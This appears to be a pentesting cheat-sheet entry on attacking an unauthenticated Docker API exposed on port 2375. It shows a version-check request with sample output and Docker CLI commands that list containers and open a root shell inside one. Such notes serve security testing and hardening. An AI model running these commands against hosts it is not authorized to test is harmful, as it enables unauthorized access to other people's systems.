Docker
======

## API
The docker API expose the port `2375`. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.

To confirm that the host is running Docker you can make a GET requests to `/version` :

```
http://<host>:<port>/version
{"Platform": {"Name": ""}, "Components": [{"Name": "Engine", "Version": "18.06.1-ce", "Details": {"ApiVersion": "1.38", "Arch": "amd64", "BuildTime": "2018-10-26T23:39:57.000000000+00:00", "Experimental": "false", "GitCommit": "e68fc7a/18.06.1-ce", "GoVersion": "go1.10.3", "KernelVersion": "4.14.47-64.38.amzn2.x86_64", "MinAPIVersion": "1.12", "Os": "linux"}}], "Version": "18.06.1-ce", "ApiVersion": "1.38", "MinAPIVersion": "1.12", "GitCommit": "e68fc7a/18.06.1-ce", "GoVersion": "go1.10.3", "Os": "linux", "Arch": "amd64", "KernelVersion": "4.14.47-64.38.amzn2.x86_64", "BuildTime": "2018-10-26T23:39:57.000000000+00:00"}
```

Then, using the CLI you can execute commands, for instance:
```
$ docker -H <host>:<port> ps

CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
be2dd8aa8222        ubuntu:14.04        "bash"              5 years ago         Up 2 seconds                            silly_elion

$ docker -H <host>:<port> exec -it <container_name> /bin/bash
root@abc:/# whoami
root
```